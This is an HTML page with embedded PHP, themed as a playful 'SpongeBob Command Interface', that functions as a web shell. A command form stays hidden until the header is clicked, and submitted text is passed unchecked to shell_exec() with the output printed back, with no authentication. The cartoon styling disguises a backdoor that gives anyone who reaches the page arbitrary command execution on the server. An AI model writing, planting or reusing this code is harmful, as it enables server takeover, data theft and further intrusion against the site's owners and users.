<!DOCTYPE html>
<html>
<head>
    <title>Command Interface</title>

    <style>
        body {
            background-image: url("spongebob.jpg");
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
        }

        h2 {
            color: white;
            background-color: #0077b6;
            padding: 15px;
            border-radius: 10px;
            max-width: 600px;
            margin: 20px auto;
            cursor: pointer;
        }

        h2:hover {
            background-color: #0096c7;
        }

        form, pre {
            background-color: rgba(255, 255, 255, 0.92);
            padding: 20px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 600px;
            overflow-x: auto;
        }

        input, button {
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #0077b6;
        }

        input {
            width: 65%;
        }

        button {
            background-color: #ffcc00;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #ffdb4d;
        }

        #commandBox {
            display: none;
        }
    </style>
</head>

<body>
    <h2 onclick="showCommandBox()">
        SpongeBob Command Interface
    </h2>

    <div id="commandBox">
        <form method="POST">
            <input
                type="text"
                name="command"
                placeholder="Enter a command"
                required
            >
            <button type="submit">Run!</button>
        </form>
    </div>

    <pre><?php
        if ($_SERVER["REQUEST_METHOD"] === "POST") {
            $command = $_POST["command"] ?? "";
            $output = shell_exec($command);
            echo htmlspecialchars($output ?? "", ENT_QUOTES, "UTF-8");
        }
    ?></pre>

    <script>
        function showCommandBox() {
            document.getElementById("commandBox").style.display = "block";
        }
    </script>
</body>
</html>
